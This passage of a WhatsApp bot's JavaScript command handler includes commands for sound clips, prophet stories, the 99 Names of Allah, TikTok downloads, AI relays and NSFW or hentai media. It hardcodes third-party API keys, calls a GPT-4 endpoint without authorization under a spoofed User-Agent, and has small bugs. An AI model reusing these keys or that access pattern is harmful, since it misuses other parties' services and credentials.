viot = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
thumb = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
let sound
if (/sound/.test(command)) sound = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') < 25) sound = `https://raw.githubusercontent.com/hyuura/Rest-Sound/main/HyuuraKane/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') > 24) sound = `https://raw.githubusercontent.com/aisyah-rest/mangkane/main/Mangkanenya/${command}.mp3`
if (/acumalaka|reza-kecap|farhan-kebab|omaga|omaga|kamu-nanya|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
if (text.toLowerCase() === 'thumb') {
await TamaMods.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false, 
contextInfo: {
externalAdReply: {
mediaUrl: 'https://instagram.com/Cyaa_ches1', 
mediaType: 2, 
title: '  ⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻  ', 
body: '  ━━━━⬤──────────  ', 
description: 'Now Playing...',
mediaType: 2, 
sourceUrl: 'https://instagram.com/Cyaa_ches1',
thumbnail: await (await fetch(viot)).buffer(), 
renderLargerThumbnail: true}}}, {quoted: pantek})
} else await TamaMods.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false}, {quoted: pantek})
break
//------(Batas Case)------//
case 'kisahnabi': {
     if (!text) return Reply(`Masukan nama nabi\nExample: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return Reply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     Reply(`${hasil}`)

}
break

const contoh = `*Asmaul Husna*
`
// data here
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`

case 'asmaulhusna': {
const asmaulhusna = [
    {
        index: 1,
        latin: "Ar Rahman",
        arabic: "الرَّحْمَنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemurah",
        translation_en: "The All Beneficent"
    },
    {
        index: 2,
        latin: "Ar Rahiim",
        arabic: "الرَّحِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Penyayang",
        translation_en: "The Most Merciful"
    },
    {
        index: 3,
        latin: "Al Malik",
        arabic: "الْمَلِكُ",
        translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
        translation_en: "The King, The Sovereign"
    },
    {
        index: 4,
        latin: "Al Quddus",
        arabic: "الْقُدُّوسُ",
        translation_id: "Yang Memiliki Mutlak sifat Suci",
        translation_en: "The Most Holy"
    },
    {
        index: 5,
        latin: "As Salaam",
        arabic: "السَّلاَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
        translation_en: "Peace and Blessing"
    },
    {
        index: 6,
        latin: "Al Mu’min",
        arabic: "الْمُؤْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
        translation_en: "The Guarantor"
    },
    {
        index: 7,
        latin: "Al Muhaimin",
        arabic: "الْمُهَيْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
        translation_en: "The Guardian, the Preserver"
    },
    {
        index: 8,
        latin: "Al ‘Aziiz",
        arabic: "الْعَزِيزُ",
        translation_id: "Yang Memiliki Mutlak Kegagahan",
        translation_en: "The Almighty, the Self Sufficient"
    },
    {
        index: 9,
        latin: "Al Jabbar",
        arabic: "الْجَبَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Perkasa",
        translation_en: "The Powerful, the Irresistible"
    },
    {
        index: 10,
        latin: "Al Mutakabbir",
        arabic: "الْمُتَكَبِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
        translation_en: "The Tremendous"
    },
    {
        index: 11,
        latin: "Al Khaliq",
        arabic: "الْخَالِقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pencipta",
        translation_en: "The Creator"
    },
    {
        index: 12,
        latin: "Al Baari’",
        arabic: "الْبَارِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
        translation_en: "The Maker"
    },
    {
        index: 13,
        latin: "Al Mushawwir",
        arabic: "الْمُصَوِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
        translation_en: "The Fashioner of Forms"
    },
    {
        index: 14,
        latin: "Al Ghaffaar",
        arabic: "الْغَفَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Pengampun",
        translation_en: "The Ever Forgiving"
    },
    {
        index: 15,
        latin: "Al Qahhaar",
        arabic: "الْقَهَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Memaksa",
        translation_en: "The All Compelling Subduer"
    },
    {
        index: 16,
        latin: "Al Wahhaab",
        arabic: "الْوَهَّابُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
        translation_en: "The Bestower"
    },
    {
        index: 17,
        latin: "Ar Razzaaq",
        arabic: "الرَّزَّاقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
        translation_en: "The Ever Providing"
    },
    {
        index: 18,
        latin: "Al Fattaah",
        arabic: "الْفَتَّاحُ",
        translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
        translation_en: "The Opener, the Victory Giver"
    },
    {
        index: 19,
        latin: "Al ‘Aliim",
        arabic: "اَلْعَلِيْمُ",
        translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
        translation_en: "The All Knowing, the Omniscient"
    },
    {
        index: 20,
        latin: "Al Qaabidh",
        arabic: "الْقَابِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
        translation_en: "The Restrainer, the Straightener"
    },
    {
        index: 21,
        latin: "Al Baasith",
        arabic: "الْبَاسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
        translation_en: "The Expander, the Munificent"
    },
    {
        index: 22,
        latin: "Al Khaafidh",
        arabic: "الْخَافِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
        translation_en: "The Abaser"
    },
    {
        index: 23,
        latin: "Ar Raafi’",
        arabic: "الرَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
        translation_en: "The Exalter"
    },
    {
        index: 24,
        latin: "Al Mu’izz",
        arabic: "الْمُعِزُّ",
        translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
        translation_en: "The Giver of Honor"
    },
    {
        index: 25,
        latin: "Al Mudzil",
        arabic: "المُذِلُّ",
        translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
        translation_en: "The Giver of Dishonor"
    },
    {
        index: 26,
        latin: "Al Samii’",
        arabic: "السَّمِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
        translation_en: "The All Hearing"
    },
    {
        index: 27,
        latin: "Al Bashiir",
        arabic: "الْبَصِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
        translation_en: "The All Seeing"
    },
    {
        index: 28,
        latin: "Al Hakam",
        arabic: "الْحَكَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
        translation_en: "The Judge, the Arbitrator"
    },
    {
        index: 29,
        latin: "Al ‘Adl",
        arabic: "الْعَدْلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Utterly Just"
    },
    {
        index: 30,
        latin: "Al Lathiif",
        arabic: "اللَّطِيفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
        translation_en: "The Subtly Kind"
    },
    {
        index: 31,
        latin: "Al Khabiir",
        arabic: "الْخَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
        translation_en: "The All Aware"
    },
    {
        index: 32,
        latin: "Al Haliim",
        arabic: "الْحَلِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
        translation_en: "The Forbearing, the Indulgent"
    },
    {
        index: 33,
        latin: "Al ‘Azhiim",
        arabic: "الْعَظِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
        translation_en: "The Magnificent, the Infinite"
    },
    {
        index: 34,
        latin: "Al Ghafuur",
        arabic: "الْغَفُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
        translation_en: "The All Forgiving"
    },
    {
        index: 35,
        latin: "As Syakuur",
        arabic: "الشَّكُورُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
        translation_en: "The Grateful"
    },
    {
        index: 36,
        latin: "Al ‘Aliy",
        arabic: "الْعَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Sublimely Exalted"
    },
    {
        index: 37,
        latin: "Al Kabiir",
        arabic: "الْكَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
        translation_en: "The Great"
    },
    {
        index: 38,
        latin: "Al Hafizh",
        arabic: "الْحَفِيظُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
        translation_en: "The Preserver"
    },
    {
        index: 39,
        latin: "Al Muqiit",
        arabic: "المُقيِت",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
        translation_en: "The Nourisher"
    },
    {
        index: 40,
        latin: "Al Hasiib",
        arabic: "الْحسِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
        translation_en: "The Reckoner"
    },
    {
        index: 41,
        latin: "Al Jaliil",
        arabic: "الْجَلِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Majestic"
    },
    {
        index: 42,
        latin: "Al Kariim",
        arabic: "الْكَرِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
        translation_en: "The Bountiful, the Generous"
    },
    {
        index: 43,
        latin: "Ar Raqiib",
        arabic: "الرَّقِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
        translation_en: "The Watchful"
    },
    {
        index: 44,
        latin: "Al Mujiib",
        arabic: "الْمُجِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
        translation_en: "The Responsive, the Answerer"
    },
    {
        index: 45,
        latin: "Al Waasi’",
        arabic: "الْوَاسِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
        translation_en: "The Vast, the All Encompassing"
    },
    {
        index: 46,
        latin: "Al Hakiim",
        arabic: "الْحَكِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
        translation_en: "The Wise"
    },
    {
        index: 47,
        latin: "Al Waduud",
        arabic: "الْوَدُودُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
        translation_en: "The Loving, the Kind One"
    },
    {
        index: 48,
        latin: "Al Majiid",
        arabic: "الْمَجِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The All Glorious"
    },
    {
        index: 49,
        latin: "Al Baa’its",
        arabic: "الْبَاعِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
        translation_en: "The Raiser of the Dead"
    },
    {
        index: 50,
        latin: "As Syahiid",
        arabic: "الشَّهِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
        translation_en: "The Witness"
    },
    {
        index: 51,
        latin: "Al Haqq",
        arabic: "الْحَقُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
        translation_en: "The Truth, the Real"
    },
    {
        index: 52,
        latin: "Al Wakiil",
        arabic: "الْوَكِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
        translation_en: "The Trustee, the Dependable"
    },
    {
        index: 53,
        latin: "Al Qawiyyu",
        arabic: "الْقَوِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
        translation_en: "The Strong"
    },
    {
        index: 54,
        latin: "Al Matiin",
        arabic: "الْمَتِينُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
        translation_en: "The Firm, the Steadfast"
    },
    {
        index: 55,
        latin: "Al Waliyy",
        arabic: "الْوَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
        translation_en: "The Protecting Friend, Patron, and Helper"
    },
    {
        index: 56,
        latin: "Al Hamiid",
        arabic: "الْحَمِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
        translation_en: "The All Praiseworthy"
    },
    {
        index: 57,
        latin: "Al Mushii",
        arabic: "الْمُحْصِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
        translation_en: "The Accounter, the Numberer of All"
    },
    {
        index: 58,
        latin: "Al Mubdi’",
        arabic: "الْمُبْدِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
        translation_en: "The Producer, Originator, and Initiator of all"
    },
    {
        index: 59,
        latin: "Al Mu’iid",
        arabic: "الْمُعِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
        translation_en: "The Reinstater Who Brings Back All"
    },
    {
        index: 60,
        latin: "Al Muhyii",
        arabic: "الْمُحْيِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
        translation_en: "The Giver of Life"
    },
    {
        index: 61,
        latin: "Al Mumiitu",
        arabic: "اَلْمُمِيتُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
        translation_en: "The Bringer of Death, the Destroyer"
    },
    {
        index: 62,
        latin: "Al Hayyu",
        arabic: "الْحَيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
        translation_en: "The Ever Living"
    },
    {
        index: 63,
        latin: "Al Qayyuum",
        arabic: "الْقَيُّومُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
        translation_en: "The Self Subsisting Sustainer of All"
    },
    {
        index: 64,
        latin: "Al Waajid",
        arabic: "الْوَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
        translation_en: "The Perceiver, the Finder, the Unfailing"
    },
    {
        index: 65,
        latin: "Al Maajid",
        arabic: "الْمَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Illustrious, the Magnificent"
    },
    {
        index: 66,
        latin: "Al Wahiid",
        arabic: "الْواحِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
        translation_en: "The One, The Unique, Manifestation of Unity"
    },
    {
        index: 67,
        latin: "Al ‘Ahad",
        arabic: "اَلاَحَدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
        translation_en: "The One, the All Inclusive, the Indivisible"
    },
    {
        index: 68,
        latin: "As Shamad",
        arabic: "الصَّمَدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
        translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
    },
    {
        index: 69,
        latin: "Al Qaadir",
        arabic: "الْقَادِرُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
        translation_en: "The All Able"
    },
    {
        index: 70,
        latin: "Al Muqtadir",
        arabic: "الْمُقْتَدِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
        translation_en: "The All Determiner, the Dominant"
    },
    {
        index: 71,
        latin: "Al Muqaddim",
        arabic: "الْمُقَدِّمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
        translation_en: "The Expediter, He who brings forward"
    },
    {
        index: 72,
        latin: "Al Mu’akkhir",
        arabic: "الْمُؤَخِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
        translation_en: "The Delayer, He who puts far away"
    },
    {
        index: 73,
        latin: "Al Awwal",
        arabic: "الأوَّلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
        translation_en: "The First"
    },
    {
        index: 74,
        latin: "Al Aakhir",
        arabic: "الآخِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
        translation_en: "The Last"
    },
    {
        index: 75,
        latin: "Az Zhaahir",
        arabic: "الظَّاهِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
        translation_en: "The Manifest; the All Victorious"
    },
    {
        index: 76,
        latin: "Al Baathin",
        arabic: "الْبَاطِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
        translation_en: "The Hidden; the All Encompassing"
    },
    {
        index: 77,
        latin: "Al Waali",
        arabic: "الْوَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
        translation_en: "The Patron"
    },
    {
        index: 78,
        latin: "Al Muta’aalii",
        arabic: "الْمُتَعَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Self Exalted"
    },
    {
        index: 79,
        latin: "Al Barri",
        arabic: "الْبَرُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
        translation_en: "The Most Kind and Righteous"
    },
    {
        index: 80,
        latin: "At Tawwaab",
        arabic: "التَّوَابُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
        translation_en: "The Ever Returning, Ever Relenting"
    },
    {
        index: 81,
        latin: "Al Muntaqim",
        arabic: "الْمُنْتَقِمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
        translation_en: "The Avenger"
    },
    {
        index: 82,
        latin: "Al Afuww",
        arabic: "العَفُوُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
        translation_en: "The Pardoner, the Effacer of Sins"
    },
    {
        index: 83,
        latin: "Ar Ra`uuf",
        arabic: "الرَّؤُوفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
        translation_en: "The Compassionate, the All Pitying"
    },
    {
        index: 84,
        latin: "Malikul Mulk",
        arabic: "مَالِكُ الْمُلْكِ",
        translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
        translation_en: "The Owner of All Sovereignty"
    },
    {
        index: 85,
        latin: "Dzul JalaaliWal Ikraam",
        arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
        translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
        translation_en: "The Lord of Majesty and Generosity"
    },
    {
        index: 86,
        latin: "Al Muqsith",
        arabic: "الْمُقْسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Equitable, the Requiter"
    },
    {
        index: 87,
        latin: "Al Jamii’",
        arabic: "الْجَامِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
        translation_en: "The Gatherer, the Unifier"
    },
    {
        index: 88,
        latin: "Al Ghaniyy",
        arabic: "الْغَنِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
        translation_en: "The All Rich, the Independent"
    },
    {
        index: 89,
        latin: "Al Mughnii",
        arabic: "الْمُغْنِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
        translation_en: "The Enricher, the Emancipator"
    },
    {
        index: 90,
        latin: "Al Maani",
        arabic: "اَلْمَانِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
        translation_en: "The Withholder, the Shielder, the Defender"
    },
    {
        index: 91,
        latin: "Ad Dhaar",
        arabic: "الضَّارَّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
        translation_en: "The Distressor, the Harmer"
    },
    {
        index: 92,
        latin: "An Nafii’",
        arabic: "النَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
        translation_en: "The Propitious, the Benefactor"
    },
    {
        index: 93,
        latin: "An Nuur",
        arabic: "النُّورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
        translation_en: "The Light"
    },
    {
        index: 94,
        latin: "Al Haadii",
        arabic: "الْهَادِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
        translation_en: "The Guide"
    },
    {
        index: 95,
        latin: "Al Baadii",
        arabic: "الْبَدِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
        translation_en: "Incomparable, the Originator"
    },
    {
        index: 96,
        latin: "Al Baaqii",
        arabic: "اَلْبَاقِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
        translation_en: "The Ever Enduring and Immutable"
    },
    {
        index: 97,
        latin: "Al Waarits",
        arabic: "الْوَارِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
        translation_en: "The Heir, the Inheritor of All"
    },
    {
        index: 98,
        latin: "Ar Rasyiid",
        arabic: "الرَّشِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
        translation_en: "The Guide, Infallible Teacher, and Knower"
    },
    {
        index: 99,
        latin: "As Shabuur",
        arabic: "الصَّبُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
        translation_en: "The Patient"
    }
]
    let json = JSON.parse(JSON.stringify(asmaulhusna))
    let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
    if (isNaN(args[0])) return Reply (`contoh:\nasmaulhusna 1`)
    if (args[0]) {
        if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
        let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
        return Reply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
    }
    Reply(`${contoh} + ${data} + ${anjuran}`)
}
break
//------(Batas Case)------//
case "ai-islam": {
if (!q) return Reply(`Example : ${prefix+command} create code html & css for hack NASA`)
var js = await fetch(`https://vapis.my.id/api/islamai?q=${q}`) 
var json = await js.json()
Reply(json.result)
}
break
//------(Batas Case)------//
case 'ai': case 'openai': {
if (!q) return Reply (`Halo ${m.pushName} 👋, perkenalkan nama saya ${botname}-Ai. Namamu pasti ${m.pushName}, bukan? ✨ Saya adalah Ai yang santai, ramah, dan suka ngobrol dengan pengguna.`)
var js = await fetch(`https://api.neoxr.eu/api/meta?q=${q}&apikey=zakkigans12`) 
var json = await js.json()
Reply(json.data.message)
}
break
//------(Batas Case)------//
case "ai-inggris": {
if (!q) return Reply (`Example : ${prefix+command} create code html & css for hack NASA`)
var js = await fetch(`https://vapis.my.id/api/luminai?q=${q}`) 
var json = await js.json()
Reply(json.result)
}
break
//------(Batas Case)------//
case "tiktok2": case "tt2": {
    if (!text) return Reply(example("linknya"));
    if (!text.includes('tiktok.com')) return Reply("Link tautan tidak valid");

    const apiUrl = `https://api.neoxr.eu/api/tiktok?url=${encodeURIComponent(text)}&apikey=zakkigans12`;

    try {
        const response = await fetch(apiUrl);
        const apiData = await response.json();

        if (!response.ok || !apiData.status || !apiData.data || !apiData.data.video) {
            return Reply("Error! Video tidak ditemukan.");
        }

        const { id, caption, author, statistic, music, video } = apiData.data;

        const videoCaption = `🎥 *TikTok Video*  
📌 *ID:* ${id}  
📝 *Caption:* ${caption}  
👤 *Author:* ${author.nickname} (@${author.uniqueId})  
👍 *Likes:* ${statistic.likes} | 💬 *Comments:* ${statistic.comments}  
🔄 *Shares:* ${statistic.shares} | 👀 *Views:* ${statistic.views}  
🎵 *Music:* ${music.title} by ${music.author}`;

        await TamaMods.sendMessage(m.chat, {
            video: { url: video },
            caption: videoCaption
        }, { quoted: pantek });

        TamaMods.sendMessage(m.chat, { react: { text: `〽️`, key: m.key }})
        
        await TamaMods.sendButtons(m.chat, {
						"body": `\`「 [ T I K T O K ] 」\`\n\n  *›  UNDUH AUDIO*`,
						"footer": "⿻  ⌜ Simple Bot V2 Gen 2 ⌟  ⿻",
						"buttons": [{
							"displayText": "𝐒𝐎𝐔𝐍𝐃",
							"id": `.ttmp3 ${text}`
						}]
					}, {
						quoted: pantek
					})
        
    } catch (error) {
        console.error(error);
        Reply("Error! Terjadi kesalahan saat mengambil video TikTok.");
    }
}
break;

case 'tiktok': case 'tt': {
				if (!text) return Reply(`*Example :* \n\n*${prefix+command} Link Url*`)
				if (!text.includes('tiktok.com')) return Reply('Url Tidak Mengandung Result Dari Tiktok!')
				const hasil = await tiktokDl(text);
				Reply(mess.wait)
				if (hasil.size_nowm) {
					await TamaMods.sendFileUrl(m.chat, hasil.data[1].url, `\`\`\`[ T I K T O K ]\`\`\`\n\n*Author* : ${hasil.author.nickname}\n*Capiton* : ${hasil.title}`, m)
					await TamaMods.sendButtons(m.chat, {
						"body": `「 \`\`\`[ T I K T O K ]\`\`\` 」\n\n  *›  UNDUH AUDIO*\n*Author* : ${hasil.author.nickname}`,
						"footer": `⿻  ⌜ ${footer} ⌟  ⿻`,
						"buttons": [{
							"displayText": "𝐒𝐎𝐔𝐍𝐃",
							"id": `.ttmp3 ${text}`
						}]
					}, {
						quoted: pantek
					})
				} else {
					for (let i = 0; i < hasil.data.length; i++) {
						await TamaMods.sendFileUrl(m.chat, hasil.data[i].url, `\`\`\`[ I M A G E ]\`\`\``, m)
					}
					let urlAudio = result.music_info.url;
            await TamaMods.sendMessage(m.chat, { audio: { url: urlAudio }, mimetype: 'audio/mpeg' }, { quoted: pantek });
				}
			}
			break
//------(Batas Case)------//
case 'hentaineko':
if (!isCreator && !isPremium) return Reply(mess.prem)
 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
TamaMods.sendMessage(m.chat, { caption: "Sange Lu Cil 😂", image: { url:waifudd2.data.url } }, { quoted: pantek })
break

        	case 'nsfw': {
        	Reply(` Process Mengambil Video NSFW `)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			TamaMods.sendMessage(m.chat, {
				video: { url: cejd.video_1 },
				caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: pantek })
		}
		break
			case 'r34': {
			async function rule34Random() {
				try {
					let response = await axios.get('https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1')
					let results = response.data
					if (!Array.isArray(results) || results.length === 0) {
						throw new Error('No images found')
					}
					let randomImage = results[Math.floor(Math.random() * results.length)]
					let imageUrl = randomImage.file_url
					if (!imageUrl) {
						throw new Error('Image URL not found')
					}
					return { status: 200, imageUrl }
				} catch (error) {
					console.error('Error:', error)
					return { status: 500, error: error.message }
				}
			}
			async function sendRandomRule34Image(m) {
				try {
					let response = await rule34Random()
					if (response.status !== 200) {
						throw new Error(response.error)
					}
					let imageUrl = response.imageUrl
					TamaMods.sendMessage(m.chat, { image: { url: imageUrl }, caption: 'Random Image from Rule34\n\n*Powered By rule34.xxx*' }, { quoted: pantek })
				} catch (e) {
					Reply(e.message)
				}
			}
			sendRandomRule34Image(m)
		}
		break
//------(Batas Case)------//
case 'gpt': {
  if (!text) return Reply(`Hai, apa yang ingin saya bantu?`)
async function openai(text, logic) {
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000, 
            "tokenLimit": 8000, 
            "completionTokenLimit": 5000, 
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let respondNya = await openai(text, "")
Reply(respondNya)
}
break



case 'hentai-neko' :
case 'hneko' :
if (!isCreator) return Reply(mess.owner)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
TamaMods.sendMessage(m.chat, { caption: mess.done, image: { url:waifudd.data.url } }, { quoted: pantek })
break
//------(Batas Case)------//
case 'hentaivid': case 'hentaivideo': {
	if (!isCreator) return Reply(mess.owner)
Reply(mess.wait)
TamaMods.sendMessage(m.chat, { video: { url: `https://api.fgmods.xyz/api/nsfw-nime/hentai-mp4?apikey=qzu9Ja5Q`}, 
caption: `success` }, { quoted: pantek })
            }
            break
            
            case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
